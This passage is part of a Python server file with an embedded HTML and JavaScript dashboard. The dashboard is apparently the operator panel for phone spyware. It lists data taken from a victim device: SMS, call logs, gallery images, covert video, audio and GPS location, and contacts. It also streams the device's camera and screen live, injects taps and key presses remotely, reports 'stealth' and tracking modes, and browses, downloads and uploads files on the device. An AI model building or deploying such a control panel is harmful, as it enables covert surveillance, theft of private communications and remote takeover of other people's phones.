      body:JSON.stringify({action,target,params:'{}',device_id:''})
    });
    const d=await r.json();
    if (d.ok) toast('Command sent (#'+d.id+')');
    else toast('Failed to send command');
  } catch(e) { toast('Error: '+e.message); }
  finally { el.style.display='none'; }
}

const ALL_CONTACTS = [];
let RENDERED_CAPS = [];

function renderCaptures(caps) {
  const el=document.getElementById('captures');
  if (!caps.length) { el.innerHTML='<div class="empty-state">No captures yet</div>'; return; }
  el.innerHTML='<div class="capture-grid">'+caps.map(c=>{
    const src=c.drive_url||(c.file?'/uploads/'+c.file.split('/').pop():'');
    const ext=src?src.split('.').pop().toLowerCase():'';
    let media='';
    if (c.type==='surveillance_video') {
      media=`<video class="thumb" src="${src}" controls preload="metadata" style="cursor:pointer;object-fit:contain;background:#000;"></video>`;
    } else if (c.type==='surveillance_audio') {
      media=`<div class="audio-preview"><audio controls src="${src}" style="width:100%;"></audio></div>`;
    } else if (c.type==='surveillance_motion'||c.type==='exfil_gallery') {
      if (src&&(ext==='jpg'||ext==='jpeg'||ext==='png')) media=`<img class="thumb" src="${src}" loading="lazy" onclick="window.open('${src}','_blank')" style="cursor:pointer" />`;
      else media=`<div style="height:160px;display:flex;align-items:center;justify-content:center;color:#576574;font-size:11px;">No preview</div>`;
    } else if (c.type==='surveillance_location') {
      media=`<div style="height:160px;display:flex;flex-direction:column;align-items:center;justify-content:center;color:#4cc9f0;font-size:12px;background:#0f0f23;gap:4px;" onclick="showLocation('${encodeURIComponent(c.data||'')}')"><div style="font-size:28px;">📍</div><div>Tap to view</div></div>`;
    } else if (c.type==='exfil_sms'||c.type==='exfil_calllog') {
      const preview=c.data||'';
      media=`<div style="height:160px;overflow:auto;padding:8px;font-size:11px;font-family:monospace;background:#0f0f23;color:#576574;white-space:pre-wrap;cursor:pointer;" onclick="showJson('${encodeURIComponent(c.data||'')}')">${preview.length>300?preview.slice(0,300)+'...':preview||'No data'}</div>`;
    } else if (src&&(c.type==='camera'||c.type==='screen')) {
      media=`<img class="thumb" src="${src}" loading="lazy" onclick="window.open('${src}','_blank')" style="cursor:pointer" />`;
    } else if (src&&c.type==='audio') {
      media=`<div class="audio-preview"><audio controls src="${src}"></audio></div>`;
    } else {
      media=`<div style="height:160px;display:flex;align-items:center;justify-content:center;color:#576574;font-size:11px;">No preview</div>`;
    }
    const driveBadge=c.drive_url?'<span style="font-size:10px"> Drive</span>':'';
    const dlBtn=src?`<button class="btn" onclick="downloadFile('${src}','${c.type}')" style="padding:2px 8px;font-size:10px;">Download</button>`:(
      (c.type==='exfil_sms'||c.type==='exfil_calllog'||c.type==='surveillance_location')?
      `<button class="btn" onclick="downloadJson('${encodeURIComponent(c.data||'')}','${c.type}')" style="padding:2px 8px;font-size:10px;">Download</button>`:'');
    return `<div class="capture-item">${media}<div class="info"><span><span class="tag">${c.type}${driveBadge}</span></span><span class="time">${c.time.slice(11,19)} ${dlBtn}</span></div></div>`;
  }).join('')+'</div>';
}

function renderContacts() {
  const el=document.getElementById('contacts');
  const q=document.getElementById('contact-search').value.toLowerCase();
  const filtered=q?ALL_CONTACTS.filter(c=>c.name.toLowerCase().includes(q)||c.phone.includes(q)||c.email.toLowerCase().includes(q)):ALL_CONTACTS;
  if (!filtered.length) { el.innerHTML='<div class="empty-state">No contacts'+(q?' matching "'+q+'"':'')+'</div>'; return; }
  el.innerHTML='<div class="contact-row">'+filtered.map(c=>
    `<div class="contact-chip"><span class="name">${c.name}</span> <span class="detail">${c.phone}${c.email?' · '+c.email:''}</span></div>`
  ).join('')+'</div>';
}

function renderCommands(cmds) {
  const el=document.getElementById('cmdlog');
  if (!cmds.length) { el.innerHTML='<div class="empty-state">No commands yet</div>'; return; }
  el.innerHTML='<div class="cmd-list">'+cmds.map(c=>
    `<div class="cmd-row"><span class="act">${c.action}</span><span class="tgt">${c.target}</span><span class="status ${c.status}">${c.status}</span>${c.result?`<span class="res">${c.result}</span>`:''}<span class="time">${c.time.slice(11,19)}</span></div>`
  ).join('')+'</div>';
}

function renderAlerts(alerts) {
  const el=document.getElementById('alerts');
  document.getElementById('alert-count').textContent=alerts.length||0;
  const motionAlerts=alerts.filter(a=>a.type==='MOTION_DETECTED');
  document.getElementById('motion-count').textContent=motionAlerts.length;
  if (!alerts.length) { el.innerHTML='<div class="empty-state">No alerts yet</div>'; return; }
  el.innerHTML='<div class="cmd-list">'+alerts.map(a=> {
    const isMotion=a.type==='MOTION_DETECTED';
    return `<div class="cmd-row" style="${isMotion?'background:#16213e;':''}"><span class="act" style="background:${isMotion?'#e94560':'#16213e'};color:#fff;">${a.type}</span><span class="tgt" style="min-width:0;">${a.message}</span><span style="color:#576574;font-size:10px;">${a.source}</span><span class="time">${a.time.slice(11,19)}</span></div>`;
  }).join('')+'</div>';
}

async function fetchData() {
  try {
    const [dataR, statusR]=await Promise.all([
      fetch('/api/data'),
      fetch('/api/status')
    ]);
    const d=await dataR.json();
    const s=await statusR.json();
    const caps=d.captures||[];
    const conts=d.contacts||[];
    const cmds=d.commands||[];
    const alerts=d.alerts||[];

    document.getElementById('capture-count').textContent=caps.length;
    document.getElementById('contact-count').textContent=conts.length;

    RENDERED_CAPS=caps;
    renderCaptures(caps);

    ALL_CONTACTS.length=0;
    ALL_CONTACTS.push(...conts);
    renderContacts();
    renderCommands(cmds);
    renderAlerts(alerts);

    // surveillance state from /api/status
    const svEl=document.getElementById('surveillance-status');
    if (s.surveillance) {
      svEl.textContent='ACTIVE'; svEl.style.color='#10ac84'; svEl.style.background='rgba(16,172,132,0.2)';
      document.getElementById('surveillance-detail').textContent='24/7 Running';
      document.getElementById('motion-state').textContent=s.motion?'Active':'Off';
      document.getElementById('motion-state').style.color=s.motion?'#feca57':'#576574';
    } else {
      svEl.textContent='Offline'; svEl.style.color='#576574'; svEl.style.background='rgba(87,101,116,0.2)';
      document.getElementById('surveillance-detail').textContent='Stopped';
      document.getElementById('motion-state').textContent='Off';
      document.getElementById('motion-state').style.color='#576574';
    }
    // tracking from /api/status
    const trEl=document.getElementById('tracking-state');
    trEl.textContent=s.tracking?'Active':'Off';
    trEl.style.color=s.tracking?'#10ac84':'#576574';
    // stealth from /api/status
    const stEl=document.getElementById('stealth-state');
    stEl.textContent=s.stealth?'Active':'Off';
    stEl.style.color=s.stealth?'#feca57':'#576574';

    const types={};
    caps.forEach(c=>{types[c.type]=(types[c.type]||0)+1});
    document.getElementById('stats').innerHTML=
      Object.entries(types).map(([k,v])=>`<div class="stat-card"><div class="num">${v}</div><div class="label">${k}</div></div>`).join('')
      +`<div class="stat-card"><div class="num">${conts.length}</div><div class="label">Contacts</div></div>`
      +`<div class="stat-card"><div class="num">${cmds.length}</div><div class="label">Commands</div></div>`
      +`<div class="stat-card"><div class="num">${alerts.length}</div><div class="label">Alerts</div></div>`;

    const dot=document.getElementById('status-dot');
    const txt=document.getElementById('status-text');
    dot.className='dot '+(s.device?'online':'offline');
    txt.textContent=s.device?'Device Online':'Waiting for device';
  } catch(e) {
    document.getElementById('status-dot').className='dot offline';
    document.getElementById('status-text').textContent='Disconnected';
  }
}

fetchData();
setInterval(fetchData, 3000);

let liveCamInterval=null;
let liveCamBlobUrl=null;
function startLiveCam() {
  const img=document.getElementById('livecam');
  const status=document.getElementById('livecam-status');
  document.getElementById('livecam-section').style.display='block';
  status.textContent='WAITING FOR FRAMES';
  status.style.color='#feca57';
  let waitCount=0;
  async function fetchFrame() {
    try {
      const r=await fetch('/api/camera/frame.jpg');
      if (r.status===204) {
        if (waitCount<30) { waitCount++; status.textContent='WAITING FOR FRAMES'; }
        else { status.textContent='TIMEOUT'; status.style.color='#e94560'; stopLiveCam(); }
        return;
      }
      const blob=await r.blob();
      if (blob.size>100) {
        if (liveCamBlobUrl) URL.revokeObjectURL(liveCamBlobUrl);
        liveCamBlobUrl=URL.createObjectURL(blob);
        img.src=liveCamBlobUrl;
        status.textContent='LIVE'; status.style.color='#10ac84';
        waitCount=0;
      } else if (waitCount<30) {
        waitCount++; status.textContent='WAITING FOR FRAMES';
      } else {
        status.textContent='TIMEOUT'; status.style.color='#e94560'; stopLiveCam();
      }
    } catch(e) {
      status.textContent='CONNECTION ERROR'; status.style.color='#e94560';
    }
  }
  fetchFrame();
  liveCamInterval=setInterval(fetchFrame, 500);
}
function stopLiveCam() {
  if (liveCamInterval) { clearInterval(liveCamInterval); liveCamInterval=null; }
  if (liveCamBlobUrl) { URL.revokeObjectURL(liveCamBlobUrl); liveCamBlobUrl=null; }
  const img=document.getElementById('livecam');
  img.src='';
  document.getElementById('livecam-section').style.display='none';
  sendCmd('camera_stream','stop');
}

// === Screen Stream ===
let screenInterval=null;
let screenBlobUrl=null;
let screenTapCount=0;
(function() {
  const overlay=document.getElementById('touch-overlay');
  const feed=document.getElementById('screen-feed');
  if (!overlay||!feed) return;

  overlay.addEventListener('click', async function(e) {
    const rect=feed.getBoundingClientRect();
    const x=e.clientX-rect.left;
    const y=e.clientY-rect.top;
    const scaleX=feed.naturalWidth/rect.width;
    const scaleY=feed.naturalHeight/rect.height;
    const tapX=Math.round(x*scaleX);
    const tapY=Math.round(y*scaleY);
    const dot=document.createElement('div');
    dot.style.cssText='position:absolute;left:'+(x-4)+'px;top:'+(y-4)+'px;width:8px;height:8px;background:#4cc9f0;border-radius:50%;pointer-events:none;opacity:0.8;z-index:10;';
    overlay.appendChild(dot);
    setTimeout(()=>dot.remove(),600);
    try {
      const fd=new FormData();
      fd.append('x',tapX); fd.append('y',tapY);
      await fetch('/api/remote/tap',{method:'POST',body:fd});
      screenTapCount++;
    } catch(_){}
  });

  overlay.addEventListener('touchstart', function(e) {
    e.preventDefault();
    const t=e.touches[0];
    const rect=feed.getBoundingClientRect();
    const x=t.clientX-rect.left;
    const y=t.clientY-rect.top;
    const scaleX=feed.naturalWidth/rect.width;
    const scaleY=feed.naturalHeight/rect.height;
    const tapX=Math.round(x*scaleX);
    const tapY=Math.round(y*scaleY);
    const dot=document.createElement('div');
    dot.style.cssText='position:absolute;left:'+(x-4)+'px;top:'+(y-4)+'px;width:8px;height:8px;background:#4cc9f0;border-radius:50%;pointer-events:none;opacity:0.8;z-index:10;';
    overlay.appendChild(dot);
    setTimeout(()=>dot.remove(),600);
    const fd=new FormData();
    fd.append('x',tapX); fd.append('y',tapY);
    fetch('/api/remote/tap',{method:'POST',body:fd}).catch(()=>{});
    screenTapCount++;
  });
})();

async function doKey(key) {
  try {
    const fd=new FormData(); fd.append('key',key);
    await fetch('/api/remote/key',{method:'POST',body:fd});
  } catch(_){}
}

function startScreenFeed() {
  const img=document.getElementById('screen-feed');
  const status=document.getElementById('screen-status');
  if (!img) return;
  status.textContent='WAITING'; status.style.color='#feca57';
  let waitCount=0;
  async function fetchFrame() {
    try {
      const r=await fetch('/api/screen/frame.jpg');
      if (r.status===204) {
        if (waitCount<10) { waitCount++; status.textContent='WAITING'; }
        else { status.textContent='OFFLINE'; status.style.color='#e94560'; }
        return;
      }
      const blob=await r.blob();
      if (blob.size>100) {
        if (screenBlobUrl) URL.revokeObjectURL(screenBlobUrl);
        screenBlobUrl=URL.createObjectURL(blob);
        img.src=screenBlobUrl;
        status.textContent='LIVE'; status.style.color='#10ac84';
        waitCount=0;
      } else if (waitCount<10) {
        waitCount++; status.textContent='WAITING';
      } else {
        status.textContent='OFFLINE'; status.style.color='#e94560';
      }
    } catch(e) {
      status.textContent='ERROR'; status.style.color='#e94560';
    }
  }
  fetchFrame();
  if (screenInterval) clearInterval(screenInterval);
  screenInterval=setInterval(fetchFrame, 800);
}

function stopScreenFeed() {
  if (screenInterval) { clearInterval(screenInterval); screenInterval=null; }
  if (screenBlobUrl) { URL.revokeObjectURL(screenBlobUrl); screenBlobUrl=null; }
  const img=document.getElementById('screen-feed');
  img.src='';
  const s=document.getElementById('screen-status');
  if (s) { s.textContent='STOPPED'; s.style.color='#576574'; }
}

// only start screen feed when switching to screen tab; stop when leaving
const origSwitchTab=switchTab;
switchTab=function(name) {
  origSwitchTab(name);
  if (name==='screen') startScreenFeed();
  else stopScreenFeed();
};

async function clearAll() {
  if (!confirm('Clear all captures, contacts, commands, and frame buffers?')) return;
  try {
    const r=await fetch('/api/clear',{method:'POST'});
    const d=await r.json();
    if (d.ok) { toast('Cleared all data'); fetchData(); }
    else toast('Clear failed');
  } catch(e) { toast('Error: '+e.message); }
}

function showJson(dataStr) {
  try {
    const parsed=JSON.parse(decodeURIComponent(dataStr));
    const win=window.open('','_blank','width=600,height=600');
    win.document.write('<html><head><style>body{background:#0f0f23;color:#c8d6e5;font-family:monospace;font-size:12px;padding:16px;white-space:pre-wrap;}</style></head><body>'+JSON.stringify(parsed,null,2)+'</body></html>');
  } catch(e) { toast('Invalid data'); }
}

function downloadFile(url, type) {
  const ext={surveillance_video:'mp4',surveillance_audio:'mp3',surveillance_motion:'jpg',exfil_gallery:'jpg',camera:'jpg',screen:'jpg',audio:'mp4'}[type]||url.split('.').pop()||'bin';
  const a=document.createElement('a');
  a.href=url;
  a.download=`${type}_${Date.now()}.${ext}`;
  document.body.appendChild(a);
  a.click();
  a.remove();
}

function downloadJson(dataStr, type) {
  try {
    const parsed=JSON.parse(decodeURIComponent(dataStr));
    let text, ext;
    if (type==='exfil_calllog') {
      ext='txt';
      const items=parsed.call_log||[];
      text=items.map((c,i)=>`${i+1}. ${c.name||'Unknown'}  ${c.number}  ${['','INCOMING','OUTGOING','MISSED'][c.type]||'?'}  ${Math.floor(c.duration/60)}m${c.duration%60}s  ${new Date(c.date).toLocaleString()}`).join('\\n');
    } else if (type==='exfil_sms') {
      ext='txt';
      const items=parsed.sms||[];
      text=items.map((c,i)=>`${i+1}. From: ${c.address}  [${['','INBOX','SENT','DRAFT'][c.type]||'?'}]  ${new Date(c.date).toLocaleString()}\\n   ${c.body}`).join('\\n');
    } else {
      ext='json';
      text=JSON.stringify(parsed,null,2);
    }
    const blob=new Blob([text],{type:'text/plain'});
    const a=document.createElement('a');
    a.href=URL.createObjectURL(blob);
    a.download=`${type}_${Date.now()}.${ext}`;
    document.body.appendChild(a);
    a.click();
    a.remove();
    URL.revokeObjectURL(a.href);
  } catch(e) { toast('Download error'); }
}

async function browseFiles(path) {
  const el=document.getElementById('file-list');
  document.getElementById('current-path').textContent=path;
  el.innerHTML='<div style="color:#576574;">Loading...</div>';
  try {
    const r=await fetch('/api/files/ls',{
      method:'POST',
      headers:{'Content-Type':'application/json'},
      body:JSON.stringify({path})
    });
    const d=await r.json();
    if (!d.ok) { el.innerHTML=`<div style="color:#e94560;">Error: ${d.error}</div>`; return; }
    const entries=d.entries||[];
    if (!entries.length) { el.innerHTML='<div style="color:#576574;">Empty directory</div>'; return; }
    el.innerHTML='<table style="width:100%;border-collapse:collapse;">'+
      '<tr style="color:#576574;font-size:10px;"><th style="text-align:left;padding:4px 8px;">Name</th><th style="text-align:right;padding:4px 8px;">Size</th><th style="padding:4px 8px;"></th></tr>'+
      entries.map(e=>{
        const icon=e.dir?'📁':'📄';
        const action=e.dir?`<button class="btn" onclick="browseFiles('${path}/${e.name}')" style="padding:1px 6px;font-size:10px;">Open</button>`
          :`<button class="btn" onclick="downloadFileFromPath('${path}/${e.name}')" style="padding:1px 6px;font-size:10px;">DL</button>`;
        return `<tr style="border-bottom:1px solid #16213e;"><td style="padding:4px 8px;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;max-width:300px;">${icon} ${e.name}</td><td style="text-align:right;padding:4px 8px;color:#576574;">${e.size}</td><td style="text-align:right;padding:4px 8px;">${action}</td></tr>`;
      }).join('')+'</table>';
  } catch(e) {
    el.innerHTML=`<div style="color:#e94560;">Error: ${e.message}</div>`;
  }
}

async function downloadFileFromPath(path) {
  try {
    toast('Downloading: '+path.split('/').pop());
    const r=await fetch('/api/files/download?path='+encodeURIComponent(path));
    if (!r.ok) { toast('Download failed'); return; }
    const blob=await r.blob();
    const a=document.createElement('a');
    a.href=URL.createObjectURL(blob);
    a.download=path.split('/').pop();
    document.body.appendChild(a);
    a.click();
    a.remove();
    URL.revokeObjectURL(a.href);
  } catch(e) { toast('Error: '+e.message); }
}

async function uploadFile() {
  const input=document.getElementById('upload-file-input');
  const status=document.getElementById('upload-status');
  const file=input.files[0];
  if (!file) { status.textContent='Select a file first'; return; }
  const path=document.getElementById('file-path-input').value;
  status.textContent='Uploading...';
  try {
    const fd=new FormData();
    fd.append('file',file);
    fd.append('dest',path);
    const r=await fetch('/api/files/upload',{method:'POST',body:fd});
    const d=await r.json();
    status.textContent=d.ok?`Uploaded to ${d.dest}`:`Failed: ${d.error}`;
    if (d.ok) browseFiles(path);
  } catch(e) { status.textContent='Error: '+e.message; }
}

function showLocation(dataStr) {
  try {
    const d=JSON.parse(decodeURIComponent(dataStr));
    const lat=d.lat||0;
    const lon=d.lon||0;
    const acc=d.accuracy||'?';
    const spd=d.speed||'?';
    const alt=d.altitude||'?';
    const prov=d.provider||'?';
    const url=`https://www.google.com/maps?q=${lat},${lon}`;
    const win=window.open('','_blank','width=500,height=500');
    win.document.write(`<html><head><style>body{background:#0f0f23;color:#c8d6e5;font-family:sans-serif;padding:20px;text-align:center;}</style></head><body>
      <h2 style="color:#4cc9f0;">Location</h2>
      <p style="font-size:24px;margin:16px 0;">📍</p>
      <p><strong>Lat:</strong> ${lat} <strong>Lon:</strong> ${lon}</p>
      <p><strong>Accuracy:</strong> ${acc}m <strong>Speed:</strong> ${spd}m/s <strong>Altitude:</strong> ${alt}m</p>
      <p><strong>Provider:</strong> ${prov}</p>
      <p style="margin-top:20px;"><a href="${url}" target="_blank" style="background:#4cc9f0;color:#000;padding:10px 24px;border-radius:6px;text-decoration:none;font-weight:600;">Open in Google Maps</a></p>
      <iframe width="100%" height="300" style="margin-top:16px;border:none;border-radius:8px;" src="https://maps.google.com/maps?q=${lat},${lon}&z=15&output=embed"></iframe>
    </body></html>`);
  } catch(e) { toast('Invalid location data'); }
}
</script>
</body>
</html>
"""

if __name__ == "__main__":
    import uvicorn
    uvicorn.run(app, host="0.0.0.0", port=8000)
